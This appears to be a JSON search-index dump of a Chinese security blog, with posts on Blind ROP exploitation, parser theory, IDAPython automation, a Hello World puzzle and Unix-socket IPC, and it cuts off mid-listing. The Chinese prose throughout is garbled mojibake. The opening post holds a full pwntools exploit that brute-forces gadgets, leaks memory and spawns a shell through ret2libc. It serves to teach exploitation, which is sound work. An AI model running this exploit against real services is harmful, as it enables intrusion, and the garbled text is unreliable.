addråä¸ä¼šå¼•èµ·æœåŠ¡å´©æºƒçš„åœ°å€ï¼Œæˆ‘çš„åšæ³•æ˜¯æš´åŠ›è·‘ï¼Œåˆ©ç”¨pwntoolsçš„å¼‚å¸¸å¤„ç†æ¥åˆ¤æ–­è¿æ¥æ˜¯å¦æŒ‚æ‰äº†ã€‚å°±åƒè¿™æ ·ç®€å•ç²—æš´çš„ä»0x400000å»è·‘ï¼Œç„¶ålogè¿›æ–‡ä»¶ï¼Œæœ€åæˆ‘åªè¦å»æŸ¥çœ‹æ–‡ä»¶å°±çŸ¥é“hang addræ˜¯ä»€ä¹ˆäº†ã€‚ 123456789101112131415161718192021222324def log_in_file(addr): #f = open('log.txt','a') #f = open('gadgets.txt','a') f = open('res.txt','a') f.write(&quot;ok addr : 0x%x\\n&quot; % addr) f.close()def get_hang_addr(addr): p = remote('127.0.0.1',10001) payload = &quot;A&quot; * 72 + p64(addr) p.recvuntil('WelCome my friend,Do you know password?') p.sendline(payload) try: #for junk p.recvline() if(p.recv() != None): log.info(&quot;alive ! at 0x%x&quot; % addr) log_in_file(addr) p.close() except EOFError as e: p.close() log.info(&quot;dead connection! at 0x%x&quot; % addr)#finally,I got hang_addr = 0x400724 2. æ‰¾åˆ°gadgetsæœ‰äº†hang addrï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¯»æ‰¾gadgetsäº†ï¼Œæˆ‘è¿™é‡Œæ˜¯ç›´æ¥æ‰¾é€šç”¨å‹gadgetsã€‚æˆ‘æ”¾ç½®çš„payloadå¦‚ä¸‹: 1payload = &quot;A&quot; * 72 + p64(addr) + p64(1)+p64(2)+p64(3)+p64(4)+p64(5)+p64(6)+p64(hang_addr) å¦‚æœè¯´ï¼Œç¨‹åºä¸æŒ‚é‚£å°±è¯´æ˜æ‰¾åˆ°äº†è¿™ä¸ªgadgets ã€‚ 1234567pop rbxpop rbppop r12pop r13pop r14pop r15ret ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415def get_gadgets_addr(addr): p = remote('127.0.0.1',10001) payload = &quot;A&quot; * 72 + p64(addr) + p64(1)+p64(2)+p64(3)+p64(4)+p64(5)+p64(6)+p64(hang_addr) p.recvuntil('WelCome my friend,Do you know password?') p.sendline(payload) try: #for junk p.recvline() if(p.recv() != None): log.info(&quot;find gadgets at 0x%x&quot; % addr) log_in_file(addr) p.close() except EOFError as e: p.close() log.info(&quot;dead connection! at 0x%x&quot; % addr) æœ€åæˆ‘å¾—åˆ°çš„ç»“æœæ˜¯ï¼š 12345678910111213141516171819202122ppppppr_addr = 0x4007bagadget2 = ppppppr_addr - 0x1agadget1 = ppppppr_addr'''gadget1: mov rdx,r13 mov rsi,r14 mov edi,r15d call QWORD PTR [r12+rbx*8] add rbx,0x1 cmp rbx,rbp jne 4007a0 &lt;__libc_csu_init+0x40&gt; add rsp,0x8gadget2: pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 ret''' 3. æ„é€ leakå»dump bin fileé€šç”¨å‹gadgetsçš„æ„é€ æˆ‘è¿™é‡Œä½¿ç”¨äº†Icemakrå†™å¥½çš„ä¸€ä¸ªå‡½æ•° 123456789101112#this func from Icemakr. thx.def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0): payload = p64(part1) # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret payload += p64(0x0) # rbx be 0x0 payload += p64(0x1) # rbp be 0x1 payload += p64(jmp2) # r12 jump to payload += p64(arg3) # r13 -&gt; rdx arg3 payload += p64(arg2) # r14 -&gt; rsi arg2 payload += p64(arg1) # r15 -&gt; edi arg1 payload += p64(part2) # part2 entry will call [rbx + r12 + 0x8] payload += 'A' * 56 # junk return payload åé¢ç›´æ¥æ„é€ leakå‡½æ•° 1234567891011121314151617181920212223242526272829def leak(addr): p = remote('127.0.0.1',10001) #p = process('./main') #raw_input('#') payload = &quot;A&quot;*72 + com_gadget(gadget1,gadget2,puts_addr,arg1=addr)+p64(hang_addr) p.recvuntil('WelCome my friend,Do you know password?') p.sendline(payload) try: p.recvline() data = p.recvline().strip() if(data != None): try: data = data[0:data.index(&quot;WelCome&quot;)] except ValueError as e: data = data #if leak data is 0x00 if data == &quot;&quot;: data = &quot;\\x00&quot; #if leak data is end with 0x0a elif(data[len(data)- 1] == '\\n' and data[len(data)- 2] == '\\n'): data = data.strip() data = data+&quot;\\x0a&quot; log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr,(data or '').encode('hex'))) p.close() return data except EOFError as e: p.close() log.info(&quot;dead connection! at 0x%x&quot; % addr) return None å…¶å®åªè¦åˆ†åˆ«ä»0x400000å’Œ0x600000å¼€å§‹dumpå°±å¯ä»¥ã€‚ 4.getshellæœ‰äº†dumpä¹‹åå°±å¾—åˆ°äº†gotè¡¨çš„ä¿¡æ¯ï¼Œä¸‹é¢å°±å¯ä»¥æ­£å¸¸çš„åšäº†ï¼Œleakå‡½æ•°åœ°å€ï¼ŒæŸ¥åç§»ï¼Œç„¶åæ„é€ ropï¼Œç„¶ågetshellã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context.log_level = 'debug'context.arch='amd64'def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0): payload = p64(part1) # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret payload += p64(0x0) # rbx be 0x0 payload += p64(0x1) # rbp be 0x1 payload += p64(jmp2) # r12 jump to payload += p64(arg3) # r13 -&gt; rdx arg3 payload += p64(arg2) # r14 -&gt; rsi arg2 payload += p64(arg1) # r15 -&gt; edi arg1 payload += p64(part2) # part2 entry will call [rbx + r12 + 0x8] payload += 'A' * 56 # junk return payloadhang_addr = 0x400724ppppppr_addr = 0x4007bagadget1 = ppppppr_addrgadget2 = ppppppr_addr - 0x1aputs_got = 0x601018pop_rdi = gadget1 + (0x400E72 - 0x400E6A + 1)p = remote('127.0.0.1',10001)payload = 'A' * 72payload += com_gadget(gadget1,gadget2,puts_got,arg1=0,arg2=puts_got)+p64(hang_addr)payload += p64(hang_addr)p.send(payload)content = p.recv()puts_addr = u64(content[:-1] + '\\x00\\x00')offset_system = 0x45390offset_str_bin_sh = 0x18c177system_addr = puts_addr - (0x6f690 - offset_system)bin_sh_addr = puts_addr - (0x6f690 - offset_str_bin_sh)payload = 'A' * 72payload += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)p.send(payload)p.interactive() 0x03: å‚è€ƒä¸å¼•ç”¨BROPIcemakrå¸ˆå‚…çš„git","link":"/2017/01/22/Have-fun-with-Blind-ROP/"},{"title":"LL LR SLR LALRå‚»å‚»åˆ†ä¸æ¸…","text":"æ’¸å…¬å¼€è¯¾çš„æ—¶å€™è¢«è¿™å‡ ä¸ªæ–‡æ³•ç»•æ™•äº†ã€‚æœäº†å¾ˆå¤šä¸œè¥¿ï¼Œåˆå¹¶æ•´ç†æ–¹ä¾¿åç»­æŸ¥çœ‹ã€‚ 0x01: æ¦‚å¿µ é¦–å…ˆï¼ŒLLæ–‡æ³•æ˜¯è‡ªé¡¶å‘ä¸‹ï¼Œç”¨çš„æ˜¯æ¨å¯¼ï¼›LRã€SLRã€LALRæ˜¯è‡ªåº•å‘ä¸Šï¼Œç”¨çš„æ˜¯è§„çº¦ã€‚ 1. LL(1)ç¬¬ä¸€ä¸ªLä»£è¡¨ä»å·¦å‘å³æ‰«æè¾“å…¥ç¬¦å·ä¸²ï¼Œç¬¬äºŒä¸ªLä»£è¡¨äº§ç”Ÿæœ€å·¦æ¨å¯¼ï¼Œ1ä»£è¡¨åœ¨åˆ†æè¿‡ç¨‹ä¸­æ‰§è¡Œæ¯ä¸€æ­¥æ¨å¯¼éƒ½è¦å‘å‰æŸ¥çœ‹ä¸€ä¸ªè¾“å…¥ç¬¦å·â€”â€”å½“å‰æ­£åœ¨å¤„ç†çš„è¾“å…¥ç¬¦å·ã€‚é¾™ä¹¦ä¸Šçš„åˆ¤æ–­è§„åˆ™æ˜¯ï¼š 123å½¢å¦‚ A-&gt;a|Î² è¿™æ ·çš„æ–‡æ³•ï¼Œæ»¡ è¶³ â‘ FIRST(Î±)âˆ© FIRST (Î² ) =Î¦ â‘¡è‹¥Îµâˆˆ FIRST( Î±)ï¼Œ è¦æ»¡è¶³ FIRST(Î²) âˆ©FOLLOW(A)=Î¦ 2. LR(0)å¦‚æœæŸä¸€æ–‡æ³•èƒ½å¤Ÿæ„é€ ä¸€å¼ åˆ†æè¡¨ï¼Œä½¿å¾—è¡¨ä¸­æ¯ä¸€ä¸ªå…ƒç´ è‡³å¤šåªæœ‰ä¸€ç§æ˜ç¡®åŠ¨ä½œï¼Œåˆ™è¯¥æ–‡æ³•ç§°ä¸ºLRæ–‡æ³•ã€‚ å…·ä½“æ¥è¯´ï¼š 1231ã€æ„é€ å®ƒçš„LR(0)é¡¹ç›®é›†åˆçš„DFAï¼ˆå³è¯†åˆ«è¯¥æ–‡æ³•å…¨éƒ¨æ´»å‰ç¼€çš„DFAï¼‰ï¼›2ã€æ ¹æ®è¯¥DFAç”»å‡ºè¯¥æ–‡æ³•çš„LR(0)åˆ†æè¡¨ï¼›3ã€åœ¨åˆ†æè¡¨ä¸­ï¼Œæ¯æ ¼è¦ä¹ˆåªæœ‰ä¸€ä¸ªå†…å®¹ï¼Œè¦ä¹ˆæ²¡æœ‰å†…å®¹ï¼Œï¼ˆå³æ— å†²çªï¼‰åˆ™ä¸ºLR(0)æ–‡æ³•ã€‚ æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯ï¼šè§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å°±å½’çº¦ 3. SLR(1)æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶çš„æ–‡æ³•æ˜¯SLR(1)æ–‡æ³• 123a.å¯¹äºåœ¨sä¸­çš„ä»»ä½•é¡¹ç›® Aâ†’Î±.XÎ²,å½“Xæ˜¯ä¸€ä¸ªç»ˆç»“ç¬¦ï¼Œä¸”Xåœ¨Follow(B)ä¸­æ—¶ï¼Œsä¸­æ²¡æœ‰å®Œæ•´çš„é¡¹ç›®Bâ†’r.b.å¯¹äºåœ¨sä¸­çš„ä»»ä½•ä¸¤ä¸ªå®Œæ•´é¡¹ç›®Aâ†’Î±.å’Œ Bâ†’Î².,Follow(A)âˆ©Follow(B)ä¸ºç©ºã€‚ æ¦‚æ‹¬å°±æ˜¯ï¼šè§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å…ˆçœ‹Followé›†ï¼Œä¸Followé›†å¯¹åº”çš„é¡¹ç›®å½’çº¦ï¼Œå…¶å®ƒæŠ¥é”™ã€‚ 4. LALR(1)LALRå³â€œLook-Ahead LRâ€ã€‚å…¶ä¸­ï¼ŒLook-Aheadä¸ºâ€œå‘å‰çœ‹â€ï¼ŒLä»£è¡¨å¯¹è¾“å…¥è¿›è¡Œä»å·¦åˆ°å³çš„æ£€æŸ¥ï¼ŒRä»£è¡¨åå‘æ„é€ å‡ºæœ€å³æ¨å¯¼åºåˆ—ã€‚ 5. LR(1)å’ŒLR(0)ä¸€è‡´ï¼Œåªæ˜¯æ„é€ è‡ªåŠ¨æœºçš„æ—¶å€™å¤šå‘å‰æŸ¥çœ‹ä¸€ä¸ªå­—ç¬¦ã€‚ 0x02: å…³ç³»ä¸å¯¹æ¯”1. SLR(1)ä¸LR(0)çš„å…³ç³»ï¼šSLR(1)ä¸LR(0)ï¼šç®€å•çš„LRè¯­æ³•åˆ†ææŠ€æœ¯ï¼ˆå³SLRï¼ˆ1ï¼‰åˆ†ææŠ€æœ¯ï¼‰çš„ä¸­å¿ƒæ€æƒ³æ˜¯æ ¹æ®æ–‡æ³•æ„é€ å‡ºLRï¼ˆ0ï¼‰è‡ªåŠ¨æœºã€‚ LR(0):è§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å°±å½’çº¦ SLR(1)è§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å…ˆçœ‹Followé›†ï¼Œä¸Followé›†å¯¹åº”çš„é¡¹ç›®å½’çº¦ï¼Œå…¶å®ƒæŠ¥é”™ã€‚ 2. LR(1)ä¸LR(0)çš„å…³ç³»ï¼šè§„èŒƒLRï¼ˆ1ï¼‰è¯­æ³•åˆ†ææŠ€æœ¯çš„ä¸­å¿ƒæ€æƒ³æ˜¯æ ¹æ®æ–‡æ³•æ„é€ å‡ºLRï¼ˆ1ï¼‰è‡ªåŠ¨æœº ï¼Œè€Œè§„èŒƒLRï¼ˆ1ï¼‰è‡ªåŠ¨æœºæ„é€ æ–¹æ³•å’ŒLRï¼ˆ0ï¼‰è‡ªåŠ¨æœºçš„æ„é€ æ–¹æ³•ç›¸åŒï¼Œåªæ˜¯å¤šå¢åŠ äº†å‘å‰æœç´¢ç¬¦å·ã€‚ 3. è§„èŒƒLR(1)ä¸LALR(1)çš„å…³ç³»ï¼šLALR(1)æ˜¯å¯¹LR(1)é¡¹é›†æ—Iä¸­å…·æœ‰åŒå¿ƒé¡¹çš„é¡¹é›†è¿›è¡Œåˆå¹¶å¾—åˆ°Iâ€™ï¼Œç„¶åæ ¹æ®Iâ€™è¿›è¡Œåˆ†æçš„æ–¹æ³•ã€‚ 4. å„ç§æ–‡æ³•èƒ½åŠ›çš„å¯¹æ¯” 0x03: å¼•ç”¨LL LR SLR LALR å‚»å‚»åˆ†ä¸æ¸… ç¼–è¯‘åŸç†:LL(1),LR(0),SLR(1),LALR(1),LR(1)å¯¹æ¯” å¦‚ä½•åˆ¤æ–­æ–‡æ³•æ˜¯LL(1)SLR(1)LR(1)LALR(1)çš„ï¼Ÿ ç»´åŸºç™¾ç§‘","link":"/2018/02/11/LL-LR-SLR-LALR%E5%82%BB%E5%82%BB%E5%88%86%E4%B8%8D%E6%B8%85/"},{"title":"IDAè‡ªåŠ¨åŒ–åˆ†æ","text":"0x00 : éœ€æ±‚â€‹ æœ€è¿‘æœ‰ä¸€äº›è‡ªåŠ¨åŒ–åˆ†æbinä¸­è°ƒç”¨è·¯å¾„çš„éœ€æ±‚ï¼Œåœ¨æŸ¥è¯¢äº†ä¸€äº›èµ„æ–™åï¼Œç»„åˆäº†ä¸€äº›ç°æœ‰æ–¹æ¡ˆï¼Œæœ€ç»ˆå®Œæˆäº†è‡ªå·±çš„è¿™ä¸ªå°å·¥å…·ã€‚ â€‹ å…·ä½“éœ€æ±‚ï¼š - è‡ªåŠ¨åˆ†æï¼Œåå°è·‘ - åˆ†æç»™å®šçš„å‡½æ•°è°ƒç”¨è·¯å¾„ 0x01 : codepythonæ¨¡ç‰ˆ12345idc.Wait() # ç­‰å¾…åˆ†æå®Œ.... # åˆ†æå·¥ä½œidc.Exit(0) # å®Œæˆåè‡ªåŠ¨é€€å‡º è¿è¡Œ1&quot;/Applications/IDA Pro 7.0/ida64.app/Contents/MacOS/ida64&quot; -c -A -S&quot;scan.py&quot; bin åˆ†æè°ƒç”¨è·¯å¾„è¿™éƒ¨åˆ†ç›´æ¥ç”¨äº†åˆ©ç”¨IDA Pythoné™æ€åˆ†æå‡½æ•°è°ƒç”¨è·¯å¾„é‡Œçš„ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142def gen_r_call_chain(func_name, osintneting): del r_call_chain[:] f_r_call_out = open('call_{0}_{1}.csv'.format(cur_bin_filename, func_name), 'w') get_my_caller(func_name, osintneting, f_r_call_out) f_r_call_out.close()def get_my_caller(func_name, osintneting, fl): if ida_kernwin.user_cancelled(): print('Cancelled') fl.close() exit() str = '{0}\\t'.format(func_name) r_call_chain.append(str) addr = get_name_ea(0, func_name) addr_ref_to = get_first_fcref_to(addr) osinteneting_end = False if addr_ref_to == BADADDR: osinteneting_end = True elif osintneting == -1: osinteneting_end = False elif osintneting == 1: osinteneting_end = True if osinteneting_end is True: length = len(r_call_chain) for idx in range(length): fl.write(r_call_chain[length - idx - 1]) sys.stdout.write(r_call_chain[length - idx - 1]) fl.write(&quot;\\n&quot;) sys.stdout.write('\\r\\n') r_call_chain.pop() return while (addr_ref_to != BADADDR) and (addr_ref_to != addr): parent_func_name = get_func_name(addr_ref_to) get_my_caller(parent_func_name, osintneting - 1, fl) addr_ref_to = get_next_fcref_to(addr, addr_ref_to) if addr_ref_to == BADADDR: r_call_chain.pop() break ##0x03 : reference å‘½ä»¤è¡Œè°ƒç”¨ idapython è„šæœ¬ åˆ©ç”¨IDA Pythoné™æ€åˆ†æå‡½æ•°è°ƒç”¨è·¯å¾„","link":"/2019/07/09/IDA%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/"},{"title":"Hello Worldå‡çº§ç‰ˆ","text":"0x00:å¶ç„¶åœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œç‰¹æ®Šçš„æ–¹å¼è¾“å‡ºhello worldï¼Œåæ¥çŸ¥é“è¿™æ˜¯cnssçš„æ‹›æ–°é¢˜ç›®ï¼Œæ„Ÿè§‰è¿˜æŒºæœ‰æ„æ€çš„ï¼Œåšäº†ä¸‹è®°å½•ä¸‹æ¥ã€‚ é¢˜ç›®è¦æ±‚ 12341.ä¸ç”¨ â€œ â€ è¾“å‡ºHello World2.ä¸ç”¨ ; è¾“å‡ºHello World3.ä¸ç”¨# è¾“å‡ºHello World4.ä¸ç”¨æ‹¬å·è¾“å‡ºHello World (åŒ…æ‹¬å„ç§æ‹¬å·()ï¼Œ&lt;&gt;ï¼Œï½›ï½ï¼Œï¼»ï¼½éƒ½ä¸èƒ½ç”¨ ) 0x01: level 11234567891011121314151617181920$ cat test.c#include &lt;stdio.h&gt;int main(void){ putchar(72); putchar(101); putchar(108); putchar(108); putchar(111); putchar(32); putchar(119); putchar(111); putchar(114); putchar(108); putchar(100); putchar(10); return 0;} 123# muhe @ muheMacBookPro in /tmp [18:10:11]$ ./testHello world 0x02: level 212345678910111213141516$ cat test.cint main(void){ if(putchar(72)) {} if(putchar(101)) {} if(putchar(108)) {} if(putchar(108)) {} if(putchar(111)) {} if(putchar(32)) {} if(putchar(119)) {} if(putchar(114)) {} if(putchar(108)) {} if(putchar(100)) {} if(putchar(10)) {}} 1234567891011# muhe @ muheMacBookPro in /tmp [18:15:10]$ clang test.c -o testtest.c:3:8: warning: implicit declaration of function 'putchar' is invalid in C99 [-Wimplicit-function-declaration] if(putchar(72)) {} ^1 warning generated.# muhe @ muheMacBookPro in /tmp [18:15:15]$ ./testHello wrld 0x03: level 3ä¸»è¦æ˜¯#ç¬¦å·çš„æ›¿ä»£ã€‚ 12345678910111213141516$ cat test.c%:include &lt;stdio.h&gt;int main(void){ if(putchar(72)) {} if(putchar(101)) {} if(putchar(108)) {} if(putchar(108)) {} if(putchar(111)) {} if(putchar(32)) {} if(putchar(119)) {} if(putchar(114)) {} if(putchar(108)) {} if(putchar(100)) {} if(putchar(10)) {}} 123456# muhe @ muheMacBookPro in /tmp [18:18:03]$ clang test.c -o test# muhe @ muheMacBookPro in /tmp [18:18:05]$ ./testHello wrld 0x04: level 4è¿™ä¸ªå¥½éš¾æƒ³â€¦shellcodeè¡Œä¹ˆæˆ‘æƒ³è¯´â€¦msfvenomç›´æ¥ç”Ÿæˆä¸€ä¸ªâ€¦é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œscä¹Ÿè¦æ‰§è¡Œå•Šï¼Œå’‹è§„é¿æ‹¬å·ï¼Œéš¾é“è¦æ‰‹å†™ä¸€ä¸ªPE/ELFæ–‡ä»¶ä¹ˆã€‚ 0x05: ç»“è¯­æŒºæœ‰æ„æ€çš„é—®é¢˜ï¼Œè¿™ä¸ªä¸œè¥¿ä»è€…è§ä»ï¼Œæ™ºè€…è§æ™ºï¼ŒçŸ¥ä¹ä¸Šè§åˆ°å¤ªå¤šæ–¹å¼äº†ï¼Œæ¯•ç«Ÿputcharå¾ˆä¸‘é™‹ï¼Œè½®å­å“¥é‚£ä¸ªä»£ç è¿˜æ˜¯æŒºå¥½çœ‹çš„ã€‚è‡³äºlevel 4ï¼Œæœ‰äººæåˆ°äº†hack cï¼Œå¾ˆå¯æƒœUBâ€¦","link":"/2017/10/01/Hello-World%E5%8D%87%E7%BA%A7%E7%89%88/"},{"title":"Linux Kernel Exploit 4 beginners","text":"0x00:Linux Kernel Exploit çš„å…¥é—¨ç³»åˆ—ï¼Œå¼€å§‹åƒæ— å¤´è‹è‡ä¼¼çš„çæ’ï¼Œæ‰¾èµ„æ–™å­¦ä¹ ï¼Œåæ¥jokerå¸ˆå‚…æŒ‡äº†æ˜è·¯ï¼Œæ‰èµ°ä¸Šæ­£è½¨ã€‚ é‚è®°å½•ä¸‰ç¯‡ï¼Œæ–‡ç« å‡å·²å‘å¸ƒåœ¨å®‰å…¨å®¢ï¼Œåšå®¢å°±åªä¸¢å‡ºé“¾æ¥ã€‚ 0x01: æ–‡ç« é“¾æ¥ã€ç³»åˆ—åˆ†äº«ã€‘Linux å†…æ ¸æ¼æ´åˆ©ç”¨æ•™ç¨‹ï¼ˆä¸€ï¼‰ï¼šç¯å¢ƒé…ç½® ã€ç³»åˆ—åˆ†äº«ã€‘Linux å†…æ ¸æ¼æ´åˆ©ç”¨æ•™ç¨‹ï¼ˆäºŒï¼‰ï¼šä¸¤ä¸ªDemo ã€ç³»åˆ—åˆ†äº«ã€‘Linux å†…æ ¸æ¼æ´åˆ©ç”¨æ•™ç¨‹ï¼ˆä¸‰)ï¼š å®æˆ˜CSAW CTFé¢˜ç›® 0x02 : ä¸€ç‚¹æƒ³æ³•è¿˜æ˜¯å¸ˆå‚…çš„è¯è¯´å¾—å¥½ï¼šåˆ†äº«ç²¾ç¥ï¼Œè®©æ›´å¤šçš„äººå¯ä»¥ä¸€èµ·å­¦ä¹ ã€‚ QAQ","link":"/2017/04/06/Linux-Kernel-Exploit-4-beginners/"},{"title":"Linux socketè¿›ç¨‹é—´é€šä¿¡åŠåº”ç”¨","text":"0x00linux socketç½‘ç»œç¼–ç¨‹å¤§å®¶è‚¯å®šä¸ä¼šé™Œç”Ÿï¼Œç„¶è€Œlinuxä¹Ÿå¯ä»¥ä½¿ç”¨socketè¿™å¥—æ¥å£æ¥å®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œå¤§æ¦‚çš„æ­¥éª¤å’Œç½‘ç»œé€šä¿¡å·®ä¸å¤šï¼Œä¹Ÿæ˜¯å¯ä»¥åŸºäºC/Sçš„ï¼ŒæœåŠ¡ç«¯åˆ›å»ºå¥—æ¥å­—ï¼Œç„¶åç»‘å®šã€ä¾¦å¬ï¼Œå®¢æˆ·ç«¯åˆ›å»ºå¥—æ¥å­—ï¼Œé“¾æ¥ï¼Œç„¶åå°±å¯ä»¥é€šä¿¡äº†ã€‚è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯å…³äºåŸºæœ¬ä½¿ç”¨ä»¥åŠä¸€ç‚¹åº”ç”¨ï¼Œä»…ä»…æ˜¯ä¸ªäººçœ‹æ³•ã€‚ 0x01 åŸºç¡€éƒ¨åˆ†1.socketåˆ›å»ºé¦–å…ˆæ¥çœ‹socketçš„åˆ›å»ºï¼Œä¾ç„¶æ˜¯ä½¿ç”¨socket()å‡½æ•°ï¼Œä¸è¿‡ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ç±»å‹å˜äº†ï¼Œå…·ä½“å‡½æ•°å¦‚ä¸‹ 1234567#include &lt;sys/socket.h&gt;#include &lt;sys/un.h&gt; .... .... unix_socket = socket(AF_UNIX, type, 0); .... .... AF_UNIXä¹Ÿå¯ä»¥æ›¿æ¢æˆAF_LOCAL 2.socketå‘½åå…³äºsocketè¿›ç¨‹é€šä¿¡ï¼Œå‘½åæ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯æ™®é€šå‘½åï¼ŒäºŒæ˜¯æŠ½è±¡å‘½åç©ºé—´ã€‚å·®åˆ«åœ¨äºï¼Œæ™®é€šå‘½åä¼šæ ¹æ®ä½ ç»™çš„åå­—äº§ç”Ÿä¸€ä¸ªsocketæ–‡ä»¶ï¼Œç„¶åä½ çš„é€šä¿¡è¿‡ç¨‹socketä¼šè¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™ç§æ–¹å¼ä¹Ÿå°±å†³å®šäº†ä½ ç¼–å†™çš„serverå¿…é¡»å¯¹è¿™ä¸ªå‘½åæ–‡ä»¶çš„è·¯å¾„æœ‰è¯»å†™æƒé™ï¼Œè€Œä¸”å®¢æˆ·ç«¯å¿…é¡»çŸ¥é“è¿™ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼›ç„¶è€ŒæŠ½è±¡å‘½åç©ºé—´çš„æ–¹å¼æ²¡æœ‰è¿™ä¸ªé™åˆ¶ï¼Œä½†æ˜¯éœ€è¦ä¸€ä¸ªå…¨å±€åç§°ï¼Œå®¢æˆ·ç«¯æ ¹æ®è¿™åç§°æ¥è¿æ¥ã€‚ 1.æ™®é€šå‘½å 1234567#define SERVER_NAME &quot;/tmp/server_socket&quot;server_addr.sun_family = AF_UNIX;strcpy(server_addr.sun_path,SERVER_NAME);server_len = sizeof(struct sockaddr_un);client_len = server_len; æœåŠ¡ç«¯å¿…é¡»å¯¹/tmp/server_socketæœ‰è¯»å†™æƒé™ï¼Œä¸”å®¢æˆ·ç«¯çŸ¥é“è¿™ä¸ªè·¯å¾„ã€‚ 2.æŠ½è±¡å‘½åç©ºé—´ 123456#define SERVER_NAME &quot;@server_socket&quot;server_addr.sun_family = AF_UNIX; strcpy(server_addr.sun_path, SERVER_NAME); server_addr.sun_path[0]=0;server_len = strlen(SERVER_NAME) + offsetof(struct sockaddr_un, sun_path); è¿™ç§æ–¹å¼å¯¹åœ°å€ç»“æ„æˆå‘˜sun_pathæ•°ç»„èµ‹å€¼çš„æ—¶å€™ï¼Œå¿…é¡»æŠŠç¬¬ä¸€ä¸ªå­—èŠ‚ç½®0ã€‚ 2.socketç»‘å®šè¿™ä¸ªæ˜¯å¯¹äºæœåŠ¡ç«¯æ¥è¯´çš„ï¼Œä¹Ÿæ˜¯ä½¿ç”¨bindå‡½æ•° 12345 .... ....bind(server_sockfd, (struct sockaddr *)&amp;server_addr, server_len); .... .... 2.socketä¾¦å¬ä½¿ç”¨listenå‡½æ•° 12345 .... ....listen(server_sockfd, 5); .... .... 2.socketè¿æ¥ä¸‹é¢è¿™ä¸ªéƒ¨åˆ†ï¼Œä½œä¸ºæœåŠ¡ç«¯ï¼Œè¦ç­‰å¾…æœåŠ¡ç«¯çš„è¿æ¥ï¼Œä½¿ç”¨acceptå‡½æ•°æ¥æ”¶è¿æ¥ç„¶ååšå¤„ç†ï¼Œä½œä¸ºæœåŠ¡ç«¯ä½¿ç”¨connectå‡½æ•°è¿æ¥ï¼Œç„¶åé€šä¿¡ã€‚ 12345678910111213while(1){ //accept client connect client_len = sizeof(client_addr); client_sockfd = accept(server_sockfd,(struct sockaddr*)&amp;client_addr, &amp;client_len); //æ¯æ¬¡è¯»ä¸€ä¸ªå­—èŠ‚å¹¶æ˜¾ç¤º read(client_sockfd, &amp;ch, 1); printf(&quot;read from client %d: %c&quot;,client_sockfd,ch); ch ++; write(client_sockfd, &amp;ch, 1); //å…³é—­è¿æ¥ close(client_sockfd);} 1234567891011//communicate with server socket while(1){ printf(&quot;set send content:&quot;); //ä»é”®ç›˜è¯»å–ä¸€ä¸ªè‡ªå·±å‘é€ç»™æœåŠ¡ç«¯ scanf(&quot;%c&quot;,&amp;ch); write(sockfd, &amp;ch, 1); printf(&quot;send to server:%c \\n&quot;,ch); read(sockfd, &amp;ch, 1); printf(&quot;read from server: %c\\n&quot;, ch); } 0x02 ç¤ºä¾‹ä»£ç è¿™é‡Œç›´æ¥ä½¿ç”¨äº†å‚è€ƒblogä¸­çš„ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//server.c#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/un.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#define SERVER_NAME &quot;@server_socket&quot;//#define SERVER_NAME &quot;/tmp/server_socket&quot;int main(){ int server_sockfd, client_sockfd; socklen_t server_len, client_len; struct sockaddr_un server_addr; struct sockaddr_un client_addr; char ch; int nread; //delete the old server socket unlink(&quot;server_socket&quot;); server_sockfd = socket(AF_UNIX, SOCK_STREAM, 0); server_addr.sun_family = AF_UNIX; strcpy(server_addr.sun_path, SERVER_NAME); server_addr.sun_path[0]=0;//æ™®é€šå‘½åä¸åº”è¯¥æœ‰è¿™å¥ server_len = strlen(SERVER_NAME) + offsetof(struct sockaddr_un, sun_path); bind(server_sockfd, (struct sockaddr *)&amp;server_addr, server_len); //listen the server listen(server_sockfd, 5); client_sockfd = -1; client_len = sizeof(client_addr); while(1){ printf(&quot;server waiting...\\n&quot;); if(client_sockfd == -1){ client_sockfd = accept(server_sockfd,(struct sockaddr*)&amp;client_addr, &amp;client_len); } nread = read(client_sockfd, &amp;ch, 1); if(nread == 0){ printf(&quot;client %d disconnected\\n&quot;,client_sockfd); client_sockfd = -1; } else{ printf(&quot;read from client %d: %c\\n&quot;,client_sockfd,ch); ch ++; write(client_sockfd, &amp;ch, 1); } usleep(100); } return 0;} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//client.c#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/un.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include 